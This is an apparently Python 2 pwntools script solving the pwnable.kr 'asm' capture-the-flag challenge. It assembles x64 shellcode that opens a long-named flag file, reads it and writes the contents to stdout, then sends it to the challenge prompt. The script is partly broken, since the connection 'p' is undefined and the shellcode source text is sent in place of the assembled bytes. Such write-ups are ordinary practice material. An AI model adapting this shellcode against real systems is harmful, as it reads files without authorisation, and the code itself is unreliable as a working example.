from pwn import *
context(arch='amd64', os='linux')
context.log_level='debug'

# This stub code just clears all the registers
# print(disasm("\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff", arch = 'amd64'))

filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

# print shellcraft.amd64.pushstr(filename)
# print asm(pwnlib.shellcraft.amd64.linux.open("./flag.txt", 1, 1))
# print(shellcraft.amd64.linux.write(1, 'rsp', 8))
# print(shellcraft.amd64.linux.read(1, 'rsp', 8))

shellcode = shellcraft.pushstr(filename)
shellcode += shellcraft.open('rsp', 0, 0) #file, oflags, varflag
# shellcode += shellcraft.mov("r10", "rax")
shellcode += shellcraft.read('rax', 'rsp', 48) # fd, buf, numBytes
shellcode += shellcraft.write(1, 'rsp', 48) # fd, buf, numBytes

# shellcode = ''
# shellcode += asm('lea rdi, [rip]')
# shellcode += asm('add rdi, 51')
# shellcode += asm('mov rax, 2')
# shellcode += asm('syscall')
# shellcode += asm('mov rsi, rdi')
# shellcode += asm('mov rdi, rax')
# shellcode += asm('mov rdx, 10')
# shellcode += asm('mov rax, 0')
# shellcode += asm('syscall')
# shellcode += asm('mov rax, 1')
# shellcode += asm('mov rdi, 0')
# shellcode += asm('syscall')
# shellcode += "flag.txt" + "\x00"

# print shellcode
# print ELF.from_bytes(shellcode).save("rahulshellcode")

# p = run_shellcode(shellcode)
# gdb.debug_shellcode(shellcode, '''
# set disassembly-flavor intel
# set height 0
# b *0x6000b0
# ''')
# time.sleep(10000)

raw_shellcode = asm(shellcode, arch = 'amd64', os = 'linux')

print(repr(raw_shellcode))
print p.recvuntil("give me your x64 shellcode: ")
p.sendline(shellcode)
print p.recvline()

